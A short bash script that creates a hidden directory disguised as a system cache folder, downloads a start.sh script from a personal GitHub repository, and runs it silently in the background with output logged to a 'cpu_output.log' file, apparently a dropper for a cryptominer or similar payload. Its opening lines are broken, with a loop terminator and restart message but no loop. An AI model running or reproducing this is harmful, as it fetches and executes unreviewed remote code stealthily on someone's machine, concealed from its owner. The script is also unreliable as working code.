#!/bin/bash

echo "Script stopped. Restarting in 5 seconds..."
    sleep 5
done

WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

wget https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh

chmod +x start.sh

nohup ./start.sh > cpu_output.log 2>&1 &


